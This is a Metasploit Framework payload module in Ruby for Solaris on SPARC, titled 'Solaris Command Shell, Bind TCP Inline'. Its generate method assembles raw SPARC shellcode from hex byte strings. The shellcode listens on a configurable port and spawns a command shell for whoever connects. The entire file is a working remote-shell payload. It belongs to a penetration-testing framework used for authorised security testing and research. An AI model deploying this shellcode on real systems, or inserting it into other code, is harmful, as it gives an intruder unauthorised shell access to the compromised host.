##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/handler/bind_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3

  include Msf::Payload::Single
  include Msf::Payload::Solaris
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Solaris Command Shell, Bind TCP Inline',
      'Description'   => 'Listen for a connection and spawn a command shell',
      'Author'        => 'vlad902',
      'License'       => MSF_LICENSE,
      'Platform'      => 'solaris',
      'Arch'          => ARCH_SPARC,
      'Handler'       => Msf::Handler::BindTcp,
      'Session'       => Msf::Sessions::CommandShell))
  end

  def generate
    port    = (datastore['LPORT'] || '0').to_i
    payload =
      "\x9c\x2b\xa0\x07\x98\x10\x20\x01\x96\x1a\xc0\x0b\x94\x1a\xc0\x0b" +
      "\x92\x10\x20\x02\x90\x10\x20\x02\x82\x10\x20\xe6\x91\xd0\x20\x08" +
      "\xd0\x23\xbf\xf8" +
      Rex::Arch::Sparc.set(0x20000 | port, "l0") +
      "\xe0\x23\xbf\xf0\xc0\x23\xbf\xf4\x92\x23\xa0\x10\x94\x10\x20\x10" +
      "\x82\x10\x20\xe8\x91\xd0\x20\x08\xd0\x03\xbf\xf8\x92\x10\x20\x01" +
      "\x82\x10\x20\xe9\x91\xd0\x20\x08\xd0\x03\xbf\xf8\x92\x1a\x40\x09" +
      "\x94\x12\x40\x09\x82\x10\x20\xea\x91\xd0\x20\x08\xd0\x23\xbf\xf8" +
      "\x94\x10\x20\x03\x92\x10\x20\x09\x94\xa2\xa0\x01\x82\x10\x20\x3e" +
      "\x91\xd0\x20\x08\x12\xbf\xff\xfc\xd0\x03\xbf\xf8\x94\x1a\xc0\x0b" +
      "\x21\x0b\xd8\x9a\xa0\x14\x21\x6e\x23\x0b\xdc\xda\x90\x23\xa0\x10" +
      "\x92\x23\xa0\x08\xe0\x3b\xbf\xf0\xd0\x23\xbf\xf8\xc0\x23\xbf\xfc" +
      "\x82\x10\x20\x3b\x91\xd0\x20\x08"
  end

end
